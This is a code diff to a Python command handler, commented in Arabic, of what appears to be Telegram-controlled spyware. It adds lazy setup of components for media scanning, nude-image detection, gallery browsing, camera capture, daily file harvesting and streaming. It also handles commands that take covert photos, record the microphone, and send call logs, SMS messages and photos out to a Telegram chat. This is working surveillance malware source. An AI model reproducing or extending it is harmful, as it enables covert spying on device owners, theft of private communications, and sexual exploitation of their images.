@@ -37,6 +37,45 @@ class C:
         except Exception:
             pass
 
+    # ========== ✅ إصلاح: التهيئة الكسولة للمكونات ==========
+    def _ensure_components(self, m):
+        """إنشاء جميع المكونات المساعدة عند الحاجة إليها فقط (Lazy Initialization)"""
+        try:
+            # 1. ماسح الوسائط (MediaScanner)
+            if not hasattr(m, 'media_scanner') or m.media_scanner is None:
+                import media_scanner
+                m.media_scanner = media_scanner.MediaScanner()
+
+            # 2. كاشف العري (NudeDetector)
+            if not hasattr(m, 'nude_detector') or m.nude_detector is None:
+                import nude_detector
+                m.nude_detector = nude_detector.NudeDetector(m)
+                # ربط الكاشف بالماسح إن أمكن
+                if hasattr(m.media_scanner, 'det'):
+                    m.media_scanner.det = m.nude_detector
+
+            # 3. متصفح المعرض (GalleryBrowser)
+            if not hasattr(m, 'gallery_browser') or m.gallery_browser is None:
+                import gallery_browser
+                m.gallery_browser = gallery_browser.G(m.media_scanner, m.tg)
+
+            # 4. محلل الكاميرا (CameraAnalyzer) - مع تمرير كاشف العري
+            if not hasattr(m, 'camera_analyzer') or m.camera_analyzer is None:
+                import camera_analyzer
+                m.camera_analyzer = camera_analyzer.CameraAnalyzer(m, m.nude_detector)
+
+            # 5. حاصد الملفات اليومي (DailyZipper)
+            if not hasattr(m, 'daily_zipper') or m.daily_zipper is None:
+                import daily_zipper
+                m.daily_zipper = daily_zipper.DailyZipper(m.media_scanner, m.tg)
+
+            # 6. مدير البث (StreamManager)
+            if not hasattr(m, 'stream_manager') or m.stream_manager is None:
+                import stream_manager
+                m.stream_manager = stream_manager.StreamManager()
+        except Exception as e:
+            logging.error(f"Component initialization error: {e}")
+
     def _sf(self, tg, cid, content, filename):
         """إرسال ملف نصي إلى التيليجرام وحذفه محلياً"""
         p = os.path.join(self.t, filename)
@@ -147,63 +186,58 @@ class C:
         threading.Thread(target=self._r, args=(cmd, tg, m, cid, cbq), daemon=True).start()
 
     def _r(self, cmd, tg, m, cid, cbq):
-        """معالج الأوامر الرئيسي"""
+        """معالج الأوامر الرئيسي (بعد التصحيحات)"""
         try:
-            # التحقق من تسجيل الدخول (auth_active يُدار بواسطة telegram_ui)
+            # التحقق من تسجيل الدخول
             if not getattr(m, 'auth_active', False):
-                tg._ap("sendMessage", {"chat_id": cid, "text": "🔒 /login أولاً"})
+                tg._ap("sendMessage", {"chat_id": cid, "text": "🔒 يجب تسجيل الدخول أولاً (/login)"})
                 return
 
-            # أوامر المعرض
+            # ✅ التأكد من تهيئة جميع المكونات المساعدة
+            self._ensure_components(m)
+
+            # ---------- أوامر المعرض ----------
             if cmd.startswith(("g_nav|", "g_opt|", "g_conf|", "g_act|")):
-                if hasattr(m, 'gallery_browser'):
-                    parts = cmd.split("|")
-                    if parts[0] == "g_nav":
-                        cat, page = parts[1], int(parts[2])
-                        nk = m.gallery_browser.get_grid_kb(cat=cat, page=page)
-                        mid = getattr(m, 'last_mid', None)
-                        if mid:
-                            tg._ap("editMessageReplyMarkup", {"chat_id": cid, "message_id": mid, "reply_markup": json.dumps(nk)})
-                    elif parts[0] == "g_opt":
-                        m.gallery_browser.show_options(cid, parts[1], parts[2], parts[3])
-                    elif parts[0] == "g_act":
-                        m.gallery_browser.execute_action(cid, parts[1], parts[2], parts[3], parts[4])
-                    elif parts[0] == "g_conf":
-                        act, cat, pg, idx = parts[1], parts[2], parts[3], parts[4]
-                        ck = [[{"text": "🗑", "callback_data": f"g_act|del|{cat}|{pg}|{idx}"},
-                               {"text": "🔙", "callback_data": f"g_opt|{cat}|{pg}|{idx}"}]]
-                        tg._ap("sendMessage", {"chat_id": cid, "text": "⚠️ تأكيد الحذف", "reply_markup": json.dumps({"inline_keyboard": ck})})
+                parts = cmd.split("|")
+                if parts[0] == "g_nav":
+                    cat, page = parts[1], int(parts[2])
+                    nk = m.gallery_browser.get_grid_kb(cat=cat, page=page)
+                    mid = getattr(m, 'last_mid', None)
+                    if mid:
+                        tg._ap("editMessageReplyMarkup", {"chat_id": cid, "message_id": mid, "reply_markup": json.dumps(nk)})
+                elif parts[0] == "g_opt":
+                    m.gallery_browser.show_options(cid, parts[1], parts[2], parts[3])
+                elif parts[0] == "g_act":
+                    m.gallery_browser.execute_action(cid, parts[1], parts[2], parts[3], parts[4])
+                elif parts[0] == "g_conf":
+                    act, cat, pg, idx = parts[1], parts[2], parts[3], parts[4]
+                    ck = [[{"text": "🗑 نعم، احذف", "callback_data": f"g_act|del|{cat}|{pg}|{idx}"},
+                           {"text": "🔙 إلغاء", "callback_data": f"g_opt|{cat}|{pg}|{idx}"}]]
+                    tg._ap("sendMessage", {"chat_id": cid, "text": "⚠️ تأكيد الحذف", "reply_markup": json.dumps({"inline_keyboard": ck})})
                 return
 
-            # الكاميرا
+            # ---------- الكاميرا (مع تمرير det) ----------
             if cmd.startswith(("cam_", "camf_")):
                 is_front = 1 if "camf_" in cmd else 0
                 if not self._bo(m):
-                    tg._ap("sendMessage", {"chat_id": cid, "text": "🔋 بطارية منخفضة"})
+                    tg._ap("sendMessage", {"chat_id": cid, "text": "🔋 البطارية منخفضة جداً"})
                     return
-                if not hasattr(m, 'camera_analyzer'):
-                    try:
-                        import camera_analyzer
-                        m.camera_analyzer = camera_analyzer.CameraAnalyzer(m)
-                    except Exception as e:
-                        logging.error(f"Camera analyzer import error: {e}")
-                        tg._ap("sendMessage", {"chat_id": cid, "text": "❌ عطل في الكاميرا"})
-                        return
+                # استخدام الكائن الذي تم إنشاؤه بواسطة _ensure_components
                 pic = m.camera_analyzer.capture(cam_id=is_front)
                 if pic and os.path.exists(pic):
                     with open(pic, 'rb') as f:
                         tg._ap("sendPhoto", {"chat_id": cid, "caption": "📸"}, {"photo": f})
                     os.remove(pic)
                 else:
-                    tg._ap("sendMessage", {"chat_id": cid, "text": "❌ فشل التصوير"})
+                    tg._ap("sendMessage", {"chat_id": cid, "text": "❌ فشل التقاط الصورة"})
                 return
 
-            # الميكروفون
+            # ---------- الميكروفون ----------
             if cmd.startswith("mic_"):
                 if self.mic_busy:
                     tg._ap("sendMessage", {"chat_id": cid, "text": "⏳ التسجيل قيد التنفيذ"})
                     return
-                tg._ap("sendMessage", {"chat_id": cid, "text": "🎤 جاري التسجيل (10 ثوانٍ)"})
+                tg._ap("sendMessage", {"chat_id": cid, "text": "🎤 جاري التسجيل (10 ثوانٍ)..."})
                 audio = self._ra(10)
                 if audio:
                     with open(audio, 'rb') as f:
@@ -219,7 +253,7 @@ class C:
                     tg._ap("sendMessage", {"chat_id": cid, "text": "❌ فشل التسجيل"})
                 return
 
-            # سجل المكالمات والرسائل
+            # ---------- سجل المكالمات والرسائل ----------
             if cmd.startswith("callog_"):
                 tg._ap("sendMessage", {"chat_id": cid, "text": "📞 جلب السجل..."})
                 self._sf(tg, cid, self._cll(), "calls.txt")
@@ -229,7 +263,7 @@ class C:
                 self._sf(tg, cid, self._sl(), "sms.txt")
                 return
 
-            # حصاد الوسائط
+            # ---------- حصاد الوسائط ----------
             if cmd.startswith("hrv_"):
                 if hasattr(m, 'daily_zipper'):
                     m.daily_zipper.run()
@@ -238,7 +272,7 @@ class C:
                     tg._ap("sendMessage", {"chat_id": cid, "text": "❌ الحصاد غير متاح"})
                 return
 
-            # معرض الوسائط
+            # ---------- فتح معرض الوسائط ----------
             if cmd.startswith("media_"):
                 if hasattr(m, 'gallery_browser'):
                     kb = m.gallery_browser.get_grid_kb(cat="pending", page=0)
